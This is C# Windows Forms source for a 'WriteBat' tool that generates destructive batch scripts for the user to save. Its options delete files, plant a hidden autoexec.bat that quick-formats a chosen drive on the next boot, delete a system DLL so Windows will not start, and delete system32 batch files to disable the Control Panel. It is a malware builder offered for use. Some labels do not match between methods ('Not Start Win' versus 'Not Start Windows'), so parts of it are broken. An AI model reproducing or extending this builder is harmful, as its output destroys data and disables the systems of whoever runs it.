using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace WriteBat
{
    public partial class frmCode : Form
    {
        private string Model;
        private string Code;

        private void Edit(string _model)
        {

            switch (_model)
            {
                case "Delete":
                    Code = "del " + txt1.Text; ;
                    break;

                case "Format Drive":
                    Code = "@ echo off " + "\n" +
                        "call attrib -r -h " + txt1.Text + ":autoexec.bat > nul:" + "\n" +
                        "echo @echo off > " + txt1.Text + ":autoexec.bat" + "\n" +
                        "echo format /autotest " + txt1.Text + ":/q > nul >> " + txt1.Text + ":autoexec.bat" + "\n" +
                        "call attrib +r +h " + txt1.Text + ":autoexec.bat > nul" + "\n" +
                        "exit";
                    break;

                case "Not Start Win":
                    Code = "del %systemroot%/system32/hall.dll";
                    break;

                case "Delete ControlPanel (98 or XP)":
                    Code = @"del %systemroot%\system32\*.bat";
                    break;
            }
        }

        public frmCode(string ModelCode)
        {
            Model = ModelCode;
            InitializeComponent();
        }

        private void frmCode_Load(object sender, EventArgs e)
        {
            switch (Model)
            {
                case "Delete":
                    txt1.Enabled = true;
                    break;

                case "Format Drive":
                    txt1.Enabled = true;
                    break;

                case "Not Start Windows":
                    label1.Enabled = false;
                    label2.Enabled = false;
                    txt1.Enabled = false;
                    break;

                case "Delete ControlPanel (98 or XP)":
                    label1.Enabled = false;
                    label2.Enabled = false;
                    txt1.Enabled = false;
                    break;
            }
        }

        private void btnWrite_Click(object sender, EventArgs e)
        {
            Edit(Model);

            frmMain frmmain = new frmMain();
            frmmain = (frmMain)this.Owner;

            if (frmmain.txtMain.Text != "")
            {
                frmmain.txtMain.Text += "\n" + Code;
            }
            else
            {
                frmmain.txtMain.Text += Code;
            }

            this.Close();
        }
    }
}
